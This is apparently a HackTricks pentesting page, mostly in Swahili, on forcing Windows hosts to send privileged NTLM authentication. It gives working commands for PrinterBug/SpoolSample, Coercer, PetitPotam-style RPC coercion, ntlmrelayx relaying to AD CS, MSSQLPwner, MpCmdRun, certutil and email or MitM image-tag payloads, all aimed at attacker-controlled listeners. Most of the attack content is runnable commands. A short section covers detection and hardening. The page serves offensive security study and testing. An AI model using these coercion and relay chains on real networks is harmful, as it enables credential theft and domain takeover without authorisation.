# Lazimisha NTLM Privileged Authentication

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) ni **mkusanyiko** wa **remote authentication triggers** uliowekwa kwenye C# kwa kutumia MIDL compiler ili kuepuka third-party dependencies.

## Abuse ya Spooler Service

Ikiwa huduma ya _**Print Spooler**_ **imewezeshwa,** unaweza kutumia baadhi ya credentials za AD zinazojulikana tayari **kuomba** print server ya Domain Controller **isasishwe** kuhusu print jobs mpya na kuiambia tu **itume notification kwa mfumo fulani**.\
Kumbuka kwamba printer inapotuma notification kwa mfumo usio wa kawaida, inahitaji **ku-authenticate dhidi ya** huo **mfumo**. Kwa hivyo, attacker anaweza kuifanya huduma ya _**Print Spooler**_ i-authenticate dhidi ya mfumo wowote, na huduma itatumia **computer account** katika authentication hii.

Chini ya hood, classic **PrinterBug** primitive hutumia vibaya **`RpcRemoteFindFirstPrinterChangeNotificationEx`** kupitia **`\\PIPE\\spoolss`**. Attacker kwanza hufungua printer/server handle, kisha hutoa client name bandia kwenye `pszLocalMachine`, hivyo target spooler huunda notification channel **kurudi kwenye host inayodhibitiwa na attacker**. Hii ndiyo sababu athari yake ni **outbound authentication coercion** badala ya code execution ya moja kwa moja.<sup>[[2]](#references)</sup>\
Ikiwa unatafuta **RCE/LPE** ndani ya spooler yenyewe, angalia [PrintNightmare](printnightmare.md). Ukurasa huu unalenga **coercion na relay**.

### Kutafuta Windows Servers kwenye domain

Tumia PowerShell kuorodhesha Windows hosts. Servers kwa kawaida huwa targets zenye kipaumbele cha juu zaidi, kwa hivyo zianzie kwanza:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Kutafuta huduma za Spooler zinazosikiliza

Kwa kutumia [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) ya @mysmartlogin (Vincent Le Toux), iliyorekebishwa kidogo, angalia ikiwa Spooler Service inasikiliza:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Unaweza pia kutumia `rpcdump.py` kwenye Linux na kutafuta **MS-RPRN** protocol:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Au, fanya majaribio ya haraka ya hosts kutoka Linux kwa kutumia **NetExec/CrackMapExec**:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Ikiwa unataka **kuorodhesha coercion surfaces** badala ya kuangalia tu kama spooler endpoint ipo, tumia **Coercer scan mode**:<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Hii ni muhimu kwa sababu kuona endpoint katika EPM kunakuambia tu kwamba print RPC interface imesajiliwa. Haimaanishi kwamba kila coercion method inaweza kufikiwa kwa privileges zako za sasa au kwamba host itatoa authentication flow inayoweza kutumika.

### Iambie service ijifanye authentication dhidi ya host yoyote

Unaweza ku-compile [SpoolSample kutoka hapa](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
au tumia [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) au [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) ikiwa uko kwenye Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
Ukitumia **Coercer**, unaweza kulenga interfaces za spooler moja kwa moja na kuepuka kukisia ni RPC method ipi imewekwa wazi:<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Modern RPC-over-TCP callbacks

Usidhani kwamba `RpcRemoteFindFirstPrinterChangeNotificationEx` call iliyofanikiwa lazima itengeneze traffic kwenye TCP/445. **Windows 11 22H2 na matoleo ya baadaye hutumia RPC over TCP kwa print communications kwa default**; RPC over named pipes imezimwa isipokuwa policy au `RpcUseNamedPipeProtocol=1` iirejeshe. Kwa hivyo, SMB-only listeners za zamani zinaweza kuripoti kwamba trigger imetumwa, huku hazipokei kamwe callback. Microsoft inaeleza TCP/135 (Endpoint Mapper) pamoja na dynamic RPC ports kwa print RPC ya kawaida, na mashirika yanaweza kuzuia range hii au kuchagua fixed print RPC port.<sup>[[10]](#references)</sup>

Current **Impacket `ntlmrelayx.py`** inajumuisha RPC relay server na Endpoint Mapper ndogo, iliyowezeshwa kwa default kwenye TCP/135. Support hii ili-merge mnamo Juni 2025 hasa ikiwa na PrinterBug-to-AD-CS chain iliyoonyeshwa, ikiruhusu authenticated RPC callback ku-relay hata victim asipofanya fallback kwenda SMB/WebDAV.<sup>[[11]](#references)</sup>
```bash
# Recent Impacket: the RPC/EPM listener starts automatically on TCP/135
# Use --template DomainController instead when coercing a DC
sudo ntlmrelayx.py -t 'http://ca.corp.local/certsrv/certfnsh.asp' \
--adcs --template Machine -smb2support

# Trigger after the listener is ready; use a name/address reachable by the victim
printerbug.py 'corp.local/user:password'@TARGET ATTACKER_FQDN
```
Tafuta `Setting up RPC Server on port 135` na `RPCD: Received connection` katika relay output. Ikiwa RPC call inarudisha expected error lakini hakuna kitu kinachofika kwenye listener, kagua print RPC transport policy ya victim, outbound filtering, DNS resolution, na ikiwa process nyingine tayari inamiliki TCP/135. Pia hakikisha kwamba `ntlmrelayx` haikuwashwa kwa `--no-rpc-server`.

### Kulazimisha HTTP badala ya SMB kwa kutumia WebClient

Kwenye systems ambazo bado zinatumia **RPC over named pipes** (legacy builds au tabia iliyorejeshwa na policy), PrinterBug ya kawaida kwa kawaida husababisha **SMB** authentication kwenda `\\attacker\share`, ambayo bado ni muhimu kwa **capture**, **relay to HTTP targets**, au **relay ambapo SMB signing haipo**.\
Hata hivyo, ku-relay **SMB to SMB** mara nyingi huzuiwa na **SMB signing**, hivyo operators wanaweza kupendelea kulazimisha **HTTP/WebDAV** authentication badala yake. Hii si fallback ya RPC-over-TCP behavior iliyoelezwa hapo juu.

Ikiwa target ina service ya **WebClient** inayoendesha, listener inaweza kubainishwa kwa namna inayofanya Windows itumie **WebDAV over HTTP**:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Hii ni muhimu hasa inapounganishwa na **`ntlmrelayx --adcs`** au HTTP relay targets nyingine, kwa sababu huepuka kutegemea SMB relayability kwenye connection iliyolazimishwa. Tahadhari muhimu ni kwamba **WebClient lazima iwe inaendeshwa** kwenye victim ili HTTP/WebDAV variant ifanye kazi.

### Combining with Unconstrained Delegation

Ikiwa attacker amedukua computer iliyosanidiwa kwa [Unconstrained Delegation](unconstrained-delegation.md), anaweza **kulazimisha printer kufanya authentication kwa computer hiyo**. Kisha **TGT** ya printer computer account huhifadhiwa kwenye memory ya unconstrained-delegation host, ambapo attacker anaweza kuipata na kuitumia tena kwa [Pass the Ticket](pass-the-ticket.md).

### Detection and hardening notes

Njia inayotegemeka zaidi ya kuondoa PrinterBug kwenye DC, PAW au server ambayo haitumii printing ni kusimamisha na kuzima Spooler. Pale ambapo printing inahitajika, imarisha kila relay destination inayowezekana (SMB server signing, LDAP signing/channel binding na EPA kwenye HTTP services kama AD CS), badala ya kudhani kuwa kuzuia TCP/445 kwenye callback path kunatosha.<sup>[[1]](#references)</sup>
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
Detection inapaswa kuhusisha call iliyothibitishwa kwa MS-RPRN UUID `12345678-1234-abcd-ef00-0123456789ab`, hasa opnum 62/65 yenye callback value isiyo ya local, pamoja na muunganisho wa haraka wa outbound SMB, HTTP au RPC kutoka kwa spooler host. Weka baseline ya **interface UUID/opnum na source/destination pairs**, si ufikiaji wa `\PIPE\spoolss` pekee, kwa sababu print stacks za sasa zinaweza kuweka callback kwenye RPC-over-TCP.<sup>[[1]](#references)[[10]](#references)[[11]](#references)</sup>

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### RPC UNC-path coercion matrix (interfaces/opnums zinazosababisha outbound auth)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: asynchronous print interface kwenye spooler pipe hiyo hiyo; tumia Coercer kuorodhesha methods zinazoweza kufikiwa kwenye host fulani<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (pia kupitia \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums zinazotumiwa vibaya mara kwa mara: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

Kumbuka: Methods hizi zinakubali parameters zinazoweza kubeba UNC path (kwa mfano, `\\attacker\share`). Zinapochakatwa, Windows ita-authenticate (katika machine/user context) kwenda kwenye UNC hiyo, hivyo kuwezesha NetNTLM capture au relay.\
Kwa spooler abuse, **MS-RPRN opnum 65** bado ndiyo primitive inayotumika zaidi na iliyoandikwa vizuri zaidi, kwa sababu protocol specification inasema wazi kwamba server huunda notification channel kurudi kwa client iliyobainishwa na `pszLocalMachine`.<sup>[[2]](#references)</sup>

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN kupitia \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effect: target hujaribu kufungua supplied backup log path na hu-authenticate kwenda kwenye UNC inayodhibitiwa na attacker.<sup>[[1]](#references)</sup>
- Practical use: shurutisha Tier 0 assets (DC/RODC/Citrix/etc.) kutoa NetNTLM, kisha relay kwenda kwenye AD CS endpoints (ESC8/ESC11 scenarios) au services nyingine zenye privileges.<sup>[[1]](#references)</sup>

## PrivExchange

Attack ya `PrivExchange` ni matokeo ya flaw iliyopatikana kwenye **Exchange Server `PushSubscription` feature**. Feature hii inaruhusu Exchange server kulazimishwa na domain user yeyote aliye na mailbox ku-authenticate kwa host yoyote iliyotolewa na client kupitia HTTP.

Kwa default, **Exchange service huendeshwa kama SYSTEM** na hupewa privileges nyingi kupita kiasi (hasa, ina **WriteDacl privileges kwenye domain kabla ya 2019 Cumulative Update**). Flaw hii inaweza kutumiwa kuwezesha **relaying ya information kwenda LDAP na baadaye kutoa domain NTDS database**. Katika hali ambazo relaying kwenda LDAP haiwezekani, flaw hii bado inaweza kutumiwa kurelay na ku-authenticate kwa hosts nyingine ndani ya domain. Exploitation iliyofanikiwa ya attack hii hutoa ufikiaji wa papo hapo kwa Domain Admin kwa kutumia authenticated domain user account yoyote.

## Ndani ya Windows

Ikiwa tayari uko ndani ya Windows machine, unaweza kulazimisha Windows iunganishe kwenye server kwa kutumia privileged accounts kupitia:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Au tumia technique hii nyingine: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Inawezekana kutumia certutil.exe lolbin (Microsoft-signed binary) ili kulazimisha NTLM authentication:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Kupitia email

Ikiwa unajua **email address** ya mtumiaji anayeingia kwenye machine unayotaka ku-compromise, unaweza tu kumtumia **email iliyo na image ya 1x1** kama vile
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
When the victim opens it, Windows attempts to authenticate.

### MitM

If you can perform a MitM attack and inject HTML into a page viewed by the victim, try injecting an image such as:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Njia nyingine za kulazimisha na ku-phish authentication ya NTLM


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking NTLMv1

Ikiwa unaweza kunasa [NTLMv1 challenges, soma hapa jinsi ya kuzicrack](../ntlm/index.html#ntlmv1-attack).\
_Kumbuka kwamba ili ku-crack NTLMv1 unahitaji kuweka Responder challenge kuwa "1122334455667788"_

## References

- [1] [Unit 42 – Authentication Coercion Inaendelea Kubadilika](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
- [10] [Microsoft – RPC connection updates for print in Windows 11](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print)
- [11] [Fortra Impacket – RPC relay server and Endpoint Mapper for ntlmrelayx](https://github.com/fortra/impacket/pull/1974)
{{#include ../../banners/hacktricks-training.md}}
